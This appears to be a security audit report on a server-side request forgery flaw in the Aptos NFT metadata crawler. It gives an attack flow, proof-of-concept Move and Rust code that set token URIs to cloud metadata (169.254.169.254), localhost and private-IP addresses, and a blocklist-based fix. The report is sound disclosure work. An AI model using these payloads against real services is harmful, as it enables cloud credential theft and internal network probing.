# Audit Report

## Title
Server-Side Request Forgery (SSRF) in NFT Metadata Crawler via Unvalidated Token URIs

## Summary
The Aptos NFT metadata crawler fetches token URIs without validating against internal network addresses, enabling attackers to exploit SSRF vulnerabilities by setting malicious token URIs pointing to localhost, private IP ranges (192.168.x.x, 10.x.x.x), or cloud metadata endpoints (169.254.169.254).

## Finding Description

Token creators can set arbitrary URI values through the `mutate_tokendata_uri` function with minimal validation. The blockchain only enforces a 512-byte length limit on URIs [1](#0-0) , with no content-based validation of schemes, domains, or IP addresses.

When token URIs are emitted via `UriMutation` events [2](#0-1) , the NFT metadata crawler processes these URIs by making HTTP requests through the `get_uri_metadata` function [3](#0-2) . This function directly passes user-controlled URIs to `reqwest::Client` without any IP address or scheme validation.

The crawler performs three types of HTTP requests to user-controlled URIs:
1. HEAD requests via `get_uri_metadata()` to check MIME type and size
2. GET requests via `JSONParser::parse()` to fetch JSON metadata [4](#0-3) 
3. GET requests via `ImageOptimizer::optimize()` to fetch and process images [5](#0-4) 

The only protection is a configurable URI blacklist [6](#0-5) , which defaults to empty and provides insufficient protection against SSRF attacks.

**Attack Flow:**
1. Attacker creates a token collection and token
2. Attacker calls `mutate_tokendata_uri()` with a malicious URI: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS metadata), `http://localhost:8080/admin`, or `http://192.168.1.1/internal-service`
3. URI passes blockchain validation (only length checked)
4. `UriMutation` event emitted on-chain
5. NFT metadata crawler processes the event
6. Crawler makes HTTP requests to the attacker-controlled URI
7. Attacker gains access to internal services, cloud metadata, or can perform port scanning

## Impact Explanation

This vulnerability represents **Medium severity** impact on the NFT metadata crawler infrastructure:

**Primary Impacts:**
- **Cloud Metadata Service Access**: Attackers can access AWS EC2 metadata (169.254.169.254) or GCP metadata endpoints to retrieve IAM credentials, API keys, and service account tokens
- **Internal Service Enumeration**: Port scanning and service discovery on internal networks accessible to the crawler
- **Credential Theft**: If the crawler runs with cloud service accounts, attackers can exfiltrate credentials
- **Data Exfiltration**: Reading files or accessing internal APIs/databases accessible from the crawler host

**Important Note:** This vulnerability does NOT affect blockchain consensus, validator nodes, on-chain state, or user funds. It exclusively impacts the infrastructure running the NFT metadata crawler service (likely operated by Aptos Labs and third-party indexers).

The impact is classified as Medium because while it enables significant infrastructure compromise (cloud credentials, internal network access), it does not directly cause:
- Loss or manipulation of on-chain funds
- Consensus safety violations
- Blockchain state inconsistencies
- Validator node compromise

## Likelihood Explanation

**Likelihood: HIGH**

The attack is trivially exploitable:
- **No special privileges required**: Any user can create tokens and mutate URIs
- **Low cost**: Transaction gas fees only
- **No rate limiting**: Attackers can create multiple tokens with different malicious URIs
- **Immediate effect**: Crawler processes URIs automatically when events are emitted
- **Wide attack surface**: Multiple HTTP request functions are vulnerable

The attack requires only:
1. An Aptos account with gas tokens
2. Calling `aptos_token::token::mutate_tokendata_uri()` with malicious URIs
3. Waiting for the crawler to process the event

## Recommendation

**Immediate Mitigations:**

1. **Implement URL validation in the crawler** before making HTTP requests:

```rust
// ecosystem/nft-metadata-crawler/src/lib.rs
use std::net::IpAddr;
use url::Url;

pub async fn get_uri_metadata(url: &str) -> anyhow::Result<(String, u32)> {
    // Validate URL scheme
    let parsed_url = Url::parse(url)?;
    match parsed_url.scheme() {
        "http" | "https" => {},
        _ => return Err(anyhow::anyhow!("Invalid URL scheme: only http/https allowed")),
    }
    
    // Validate against SSRF
    if let Some(host) = parsed_url.host() {
        match host {
            url::Host::Domain(domain) => {
                // Block localhost, metadata endpoints
                if domain == "localhost" 
                    || domain.ends_with(".local")
                    || domain.contains("metadata.google.internal")
                    || domain == "169.254.169.254" {
                    return Err(anyhow::anyhow!("Blocked internal domain"));
                }
            },
            url::Host::Ipv4(ip) => {
                // Block private IP ranges
                if ip.is_loopback() 
                    || ip.is_private() 
                    || ip.is_link_local() {
                    return Err(anyhow::anyhow!("Blocked private IP address"));
                }
            },
            url::Host::Ipv6(ip) => {
                if ip.is_loopback() || ip.is_unspecified() {
                    return Err(anyhow::anyhow!("Blocked private IPv6 address"));
                }
            },
        }
    }
    
    let client = Client::builder()
        .timeout(Duration::from_secs(MAX_HEAD_REQUEST_RETRY_SECONDS))
        .build()
        .context("Failed to build reqwest client")?;
    let request = client.head(url.trim());
    let response = request.send().await?;
    // ... rest of function
}
```

2. **Add comprehensive default blacklist** in `ParserConfig`:
   - `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`
   - `localhost`, `*.local`, `metadata.google.internal`

3. **Use DNS resolver that blocks internal IPs** or run crawler in isolated network with egress filtering

4. **Consider on-chain validation** (long-term): Add URI format validation in `mutate_tokendata_uri()` to prevent storing obviously malicious URIs, though this doesn't prevent all SSRF vectors.

## Proof of Concept

**Move PoC - Creating malicious token URI:**

```move
#[test(creator = @0xCAFE)]
fun test_ssrf_via_uri_mutation(creator: &signer) {
    use aptos_framework::account;
    use std::string;
    use aptos_token::token;
    
    account::create_account_for_test(@0xCAFE);
    
    // Create collection and token
    token::create_collection(
        creator,
        string::utf8(b"SSRF Collection"),
        string::utf8(b"Testing SSRF"),
        string::utf8(b"https://example.com"),
        1000,
        vector[false, false, false]
    );
    
    let token_data_id = token::create_tokendata(
        creator,
        string::utf8(b"SSRF Collection"),
        string::utf8(b"SSRF Token"),
        string::utf8(b"SSRF test token"),
        0,
        string::utf8(b"https://example.com"),
        @0xCAFE,
        100,
        0,
        token::create_token_mutability_config(&vector[false, true, false, false, false]),
        vector[],
        vector[],
        vector[]
    );
    
    // Mutate to AWS metadata endpoint
    token::mutate_tokendata_uri(
        creator,
        token_data_id,
        string::utf8(b"http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    );
    
    // Mutate to localhost
    token::mutate_tokendata_uri(
        creator,
        token_data_id,
        string::utf8(b"http://localhost:8080/admin/secrets")
    );
    
    // Mutate to private IP
    token::mutate_tokendata_uri(
        creator,
        token_data_id,
        string::utf8(b"http://192.168.1.1/internal-api")
    );
    
    // All mutations succeed - crawler will attempt to fetch these
}
```

**Rust PoC - Demonstrating SSRF in crawler:**

```rust
// Demonstrates the SSRF vulnerability
#[tokio::test]
async fn test_ssrf_vulnerability() {
    use aptos_nft_metadata_crawler::get_uri_metadata;
    
    // These requests will succeed without validation
    let ssrf_uris = vec![
        "http://169.254.169.254/latest/meta-data/",  // AWS metadata
        "http://localhost:8080/admin",                // Localhost
        "http://192.168.1.1/internal",                // Private IP
        "http://metadata.google.internal/",           // GCP metadata
    ];
    
    for uri in ssrf_uris {
        match get_uri_metadata(uri).await {
            Ok((mime, size)) => {
                println!("SSRF successful for {}: mime={}, size={}", uri, mime, size);
            },
            Err(e) => {
                println!("Request failed (may indicate target is unreachable): {}", e);
            }
        }
    }
}
```

## Notes

While this vulnerability exists in the Aptos Core repository codebase, it specifically affects the NFT metadata crawler ecosystem service rather than the core blockchain protocol. The vulnerability does not impact:
- Blockchain consensus or safety
- Validator node operations
- On-chain state or funds
- Move VM execution

The impact is isolated to infrastructure running the crawler service. However, given that this crawler is likely operated by Aptos Labs and third-party indexers, SSRF exploitation could lead to significant cloud infrastructure compromise, making it a legitimate Medium severity finding for the ecosystem components.

### Citations

**File:** aptos-move/framework/aptos-token/sources/token.move (L816-829)
```text
    public fun mutate_tokendata_uri(
        creator: &signer,
        token_data_id: TokenDataId,
        uri: String
    ) acquires Collections {
        assert!(uri.length() <= MAX_URI_LENGTH, error::invalid_argument(EURI_TOO_LONG));
        assert_tokendata_exists(creator, token_data_id);

        let all_token_data = &mut Collections[token_data_id.creator].token_data;
        let token_data = all_token_data.borrow_mut(token_data_id);
        assert!(token_data.mutability_config.uri, error::permission_denied(EFIELD_NOT_MUTABLE));
        token_event_store::emit_token_uri_mutate_event(creator, token_data_id.collection, token_data_id.name, token_data.uri ,uri);
        token_data.uri = uri;
    }
```

**File:** types/src/account_config/events/uri_mutation.rs (L16-23)
```rust
#[derive(Debug, Deserialize, Serialize)]
pub struct UriMutation {
    creator: AccountAddress,
    collection: String,
    token: String,
    old_uri: String,
    new_uri: String,
}
```

**File:** ecosystem/nft-metadata-crawler/src/lib.rs (L17-38)
```rust
pub async fn get_uri_metadata(url: &str) -> anyhow::Result<(String, u32)> {
    let client = Client::builder()
        .timeout(Duration::from_secs(MAX_HEAD_REQUEST_RETRY_SECONDS))
        .build()
        .context("Failed to build reqwest client")?;
    let request = client.head(url.trim());
    let response = request.send().await?;
    let headers = response.headers();

    let mime_type = headers
        .get(header::CONTENT_TYPE)
        .map(|value| value.to_str().unwrap_or("text/plain"))
        .unwrap_or("text/plain")
        .to_string();
    let size = headers
        .get(header::CONTENT_LENGTH)
        .and_then(|value| value.to_str().ok())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);

    Ok((mime_type, size))
}
```

**File:** ecosystem/nft-metadata-crawler/src/utils/json_parser.rs (L27-76)
```rust
    pub async fn parse(
        uri: String,
        max_file_size_bytes: u32,
    ) -> anyhow::Result<(Option<String>, Option<String>, Value)> {
        PARSE_JSON_INVOCATION_COUNT.inc();
        let (mime, size) = get_uri_metadata(&uri).await?;
        if ImageFormat::from_mime_type(&mime).is_some() {
            FAILED_TO_PARSE_JSON_COUNT
                .with_label_values(&["found image instead"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "JSON parser received image file: {}, skipping",
                mime
            )));
        } else if size > max_file_size_bytes {
            FAILED_TO_PARSE_JSON_COUNT
                .with_label_values(&["json file too large"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "JSON parser received file too large: {} bytes, skipping",
                size
            )));
        }

        let op = || {
            async {
                info!(asset_uri = uri, "Sending request for asset_uri");

                let client = Client::builder()
                    .timeout(Duration::from_secs(MAX_JSON_REQUEST_RETRY_SECONDS))
                    .build()
                    .context("Failed to build reqwest client")?;

                let response = client
                    .get(uri.trim())
                    .send()
                    .await
                    .context("Failed to get JSON")?;

                let parsed_json = response
                    .json::<Value>()
                    .await
                    .context("Failed to parse JSON")?;

                let raw_image_uri = parsed_json["image"].as_str().map(|s| s.to_string());
                let raw_animation_uri =
                    parsed_json["animation_url"].as_str().map(|s| s.to_string());

                Ok((raw_image_uri, raw_animation_uri, parsed_json))
            }
```

**File:** ecosystem/nft-metadata-crawler/src/utils/image_optimizer.rs (L34-90)
```rust
    pub async fn optimize(
        uri: &str,
        max_file_size_bytes: u32,
        image_quality: u8,
        max_image_dimensions: u32,
    ) -> anyhow::Result<(Vec<u8>, ImageFormat)> {
        OPTIMIZE_IMAGE_INVOCATION_COUNT.inc();
        let (_, size) = get_uri_metadata(uri).await?;
        if size > max_file_size_bytes {
            FAILED_TO_OPTIMIZE_IMAGE_COUNT
                .with_label_values(&["Image file too large"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "Image optimizer received file too large: {} bytes, skipping",
                size
            )));
        }

        let op = || {
            async {
                info!(image_uri = uri, "Sending request for image");

                let client = Client::builder()
                    .timeout(Duration::from_secs(MAX_IMAGE_REQUEST_RETRY_SECONDS))
                    .build()
                    .context("Failed to build reqwest client")?;

                let response = client
                    .get(uri.trim())
                    .send()
                    .await
                    .context("Failed to get image")?;

                let img_bytes = response
                    .bytes()
                    .await
                    .context("Failed to load image bytes")?;

                let format =
                    image::guess_format(&img_bytes).context("Failed to guess image format")?;

                match format {
                    ImageFormat::Gif | ImageFormat::Avif => Ok((img_bytes.to_vec(), format)),
                    _ => {
                        let img = image::load_from_memory(&img_bytes)
                            .context(format!("Failed to load image from memory: {} bytes", size))?;
                        let (nwidth, nheight) = Self::calculate_dimensions_with_ration(
                            min(max(img.width(), img.height()), max_image_dimensions),
                            img.width(),
                            img.height(),
                        );
                        let resized_image =
                            resize(&img.to_rgba8(), nwidth, nheight, FilterType::Gaussian);
                        Ok(Self::to_image_bytes(resized_image, image_quality)?)
                    },
                }
            }
```

**File:** ecosystem/nft-metadata-crawler/src/parser/worker.rs (L386-391)
```rust
    fn is_blacklisted_uri(&mut self, uri: &str) -> bool {
        self.parser_config
            .uri_blacklist
            .iter()
            .any(|blacklist_uri| uri.contains(blacklist_uri))
    }
```
